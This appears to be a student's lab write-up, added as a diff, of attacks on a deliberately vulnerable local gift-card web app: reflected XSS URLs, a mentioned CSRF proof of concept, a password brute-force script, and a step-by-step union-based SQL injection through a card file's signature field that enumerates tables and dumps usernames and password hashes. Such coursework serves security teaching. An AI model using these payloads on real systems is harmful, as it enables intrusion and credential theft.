@@ -1,0 +1,36 @@
+1. XSS Attack
+http://127.0.0.1:8000/buy/7?director=<script>alert('XSS ATTACK');</script>
+http://127.0.0.1:8000/buy/7?director=<script>document.location="https://www.google.com/"</script>
+ *This two urls show the existence of xss in the site , one pops up an alert box , while the other redirects the user to another site.
+Solution: XSS_Solutrion.jpg attached where is thew solution. item-single.html fixed to resolve XSS.
+
+
+2. CSRF POC
+the script is workings/csrf_poc.html is able to gift a friend when he visits the page without his consent.
+CSRF_Attack_Record.mp4 shows how I attacked. And after fix codes I see output at CSRF_Request_Aborted_After_Fix.jpg. Please check codes under #KG most of comments.
+
+3. sqlinjection: {"merchant_id": "NYU Apparel Card", "customer_id": "trustie", "total_value": "2323", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "12'union select password from LegacySite_user--"}]}
+
+payload one is uploading a file with the following contents
+{"merchant_id": "NYU Apparel Card", "customer_id": "trustie", "total_value": "2323", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "12'or 1=1--"}]}
+* we get all cards information : Found card with data: Card object (9) Card object (10) Card object (5) Card object (11) Card object (4) Card object (3) Card object (2) Card object (1) Card object (8) Card object (12) Card object (6) Card object (7) 
+{"merchant_id": "NYU Apparel Card", "customer_id": "trustie", "total_value": "2323", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "12'union select sqlite_version()--"}]}
+* we get : Found card with data: Card object (3.40.1) 
+{"merchant_id": "NYU Apparel Card", "customer_id": "trustie", "total_value": "2323", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "12'union select tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--"}]}
+* Found card with data: Card object (LegacySite_card) Card object (LegacySite_product) Card object (LegacySite_user) Card object (auth_group) Card object (auth_group_permissions) Card object (auth_permission) Card object (auth_user) Card object (auth_user_groups) Card object (auth_user_user_permissions) Card object (django_admin_log) Card object (django_content_type) Card object (django_migrations) Card object (django_session) 
+* we basically get some tables , so we can go ahead and get the password hash and name from the legacysite_user database
+{"merchant_id": "NYU Apparel Card", "customer_id": "trustie", "total_value": "2323", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "12'union select sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='LegacySite_user'--"}]}
+* we get the following tables : Found card with data: Card object (CREATE TABLE "LegacySite_user" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "last_login" datetime NULL, "username" varchar(30) NOT NULL UNIQUE, "password" varchar(97) NOT NULL)) 
+	- id
+	- password
+	- username
+	- last_login
+*we can now dump the contents of this table
+{"merchant_id": "NYU Apparel Card", "customer_id": "trustie", "total_value": "2323", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "12'union select username from LegacySite_user--"}]}
+* we get the following users : Found card with data: Card object ('order by 1 --) Card object (1'or 1=1--) Card object (<script>alert(1)</script>) Card object (admin) Card object (haha) Card object (haha2) Card object (trustie) 
+{"merchant_id": "NYU Apparel Card", "customer_id": "trustie", "total_value": "2323", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "12'union select password from LegacySite_user--"}]}
+* we get the following hashes : Found card with data: Card object (000000000000000000000000000078d2$18821d89de11ab18488fdc0a01f1ddf4d290e198b0f80cd4974fc031dc2615a3) Card object (000000000000000000000000000078d2$7a34c82ef4dd97da9b300a61d6af9a24e475f5348df1bd52961aedad4b766957) Card object (000000000000000000000000000078d2$db5e7a7768aa5977d5c96dade6c76bf6f07829688f29e00d93a34a737592c39f) 
+
+4. Password bruteforce attack
+the script "python3 bruteforce.py" was able to bruteforce the administrator password , and got adminpassword
+
